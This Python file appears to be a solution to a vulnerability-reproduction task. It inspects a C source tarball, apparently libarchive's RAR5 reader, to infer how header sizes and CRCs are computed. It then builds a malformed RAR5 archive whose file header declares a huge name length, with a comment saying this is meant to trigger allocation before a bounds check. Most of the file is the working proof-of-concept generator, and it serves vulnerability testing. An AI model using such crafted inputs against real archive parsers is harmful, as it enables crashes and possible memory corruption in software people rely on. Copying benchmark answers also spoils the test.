import io
import os
import re
import tarfile
import zlib
from typing import Optional, Tuple


def _vint_encode(value: int) -> bytes:
    if value < 0:
        raise ValueError("value must be non-negative")
    out = bytearray()
    while True:
        b = value & 0x7F
        value >>= 7
        if value:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _u32le(x: int) -> bytes:
    return int(x & 0xFFFFFFFF).to_bytes(4, "little", signed=False)


def _crc32(data: bytes) -> int:
    return zlib.crc32(data) & 0xFFFFFFFF


def _iter_tar_text_files(src_path: str):
    try:
        with tarfile.open(src_path, mode="r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name_l = (m.name or "").lower()
                if not (name_l.endswith(".c") or name_l.endswith(".h") or name_l.endswith(".cc") or name_l.endswith(".cpp")):
                    continue
                if m.size <= 0 or m.size > 3_000_000:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                try:
                    data = f.read()
                finally:
                    f.close()
                if not data:
                    continue
                try:
                    text = data.decode("utf-8", errors="ignore")
                except Exception:
                    try:
                        text = data.decode("latin-1", errors="ignore")
                    except Exception:
                        continue
                yield m.name, text
    except Exception:
        return


def _analyze_rar5_source(src_path: str) -> Tuple[bool, bool]:
    size_includes_self = True
    crc_includes_size_field = True

    best_text = None
    best_score = -1
    for name, text in _iter_tar_text_files(src_path):
        nl = name.lower()
        if "rar5" not in nl and "rar" not in nl:
            continue
        score = 0
        if "rar5" in nl:
            score += 5
        if "support_format_rar5" in nl or "format_rar5" in nl:
            score += 10
        if "name" in text and "size" in text and "rar5" in text.lower():
            score += 5
        if "archive_read_support_format_rar5" in text:
            score += 20
        if score > best_score:
            best_score = score
            best_text = text

    if not best_text:
        return size_includes_self, crc_includes_size_field

    t = best_text

    # Guess whether HEAD_SIZE counts bytes after CRC including the HEAD_SIZE field itself.
    # Look for typical patterns like (4 + header_size) for read-ahead lengths.
    if re.search(r'__archive_read_ahead\s*\(\s*[^,]+,\s*\(?\s*4\s*\+\s*header_size\s*\)?', t):
        size_includes_self = True
    elif re.search(r'__archive_read_ahead\s*\(\s*[^,]+,\s*\(?\s*4\s*\+\s*header_size\s*\+\s*', t):
        size_includes_self = False

    # Guess whether CRC includes the HEAD_SIZE varint field.
    # If CRC starts at p+4+<len_of_head_size>, then it excludes the size varint.
    if re.search(r'crc32\s*\(\s*0\s*,\s*[^,]*\+\s*4\s*\+\s*[A-Za-z0-9_]*size[^,]*,\s*', t):
        crc_includes_size_field = False
    elif re.search(r'crc32\s*\(\s*0\s*,\s*[^,]*\+\s*4\s*,\s*', t):
        crc_includes_size_field = True

    return size_includes_self, crc_includes_size_field


def _make_rar5_block(header_content_after_size: bytes, size_includes_self: bool, crc_includes_size_field: bool) -> bytes:
    if size_includes_self:
        size_val = len(_vint_encode(0)) + len(header_content_after_size)
        while True:
            enc = _vint_encode(size_val)
            new_size_val = len(enc) + len(header_content_after_size)
            if new_size_val == size_val:
                break
            size_val = new_size_val
        size_enc = _vint_encode(size_val)
    else:
        size_val = len(header_content_after_size)
        size_enc = _vint_encode(size_val)

    header_after_crc = size_enc + header_content_after_size
    if crc_includes_size_field:
        crc = _crc32(header_after_crc)
    else:
        crc = _crc32(header_content_after_size)

    return _u32le(crc) + header_after_crc


class Solution:
    def solve(self, src_path: str) -> bytes:
        size_includes_self, crc_includes_size_field = _analyze_rar5_source(src_path)

        sig = b"Rar!\x1a\x07\x01\x00"

        # MAIN header block (type=1).
        # Keep minimal: type, flags, main_flags (all VINT).
        main_type = _vint_encode(1)
        main_flags = _vint_encode(0)
        main_body = _vint_encode(0)  # main header specific flags
        main_hdr_content = main_type + main_flags + main_body
        main_block = _make_rar5_block(main_hdr_content, size_includes_self, crc_includes_size_field)

        # FILE header block (type=2).
        # Use HEAD_FLAGS=2 (data area present) with DATA_SIZE=0 to be tolerant.
        # Then minimal file fields as VINTs.
        # Put a gigantic name length to trigger allocation before bounds check.
        file_type = _vint_encode(2)
        file_hdr_flags = _vint_encode(2)
        file_data_size = _vint_encode(0)

        file_flags = _vint_encode(0)
        unpacked_size = _vint_encode(0)
        attributes = _vint_encode(0)

        # Compression info: use a 2-byte VINT (128) to tolerate either VINT or fixed 2-byte reads.
        comp_info = b"\x80\x01"
        host_os = _vint_encode(0)

        # Huge value: (1<<63)-1 encodes as 0xff..0x7f, also reads large if misinterpreted as u32.
        huge_name_len = _vint_encode((1 << 63) - 1)

        file_hdr_content = (
            file_type +
            file_hdr_flags +
            file_data_size +
            file_flags +
            unpacked_size +
            attributes +
            comp_info +
            host_os +
            huge_name_len
        )
        file_block = _make_rar5_block(file_hdr_content, size_includes_self, crc_includes_size_field)

        return sig + main_block + file_block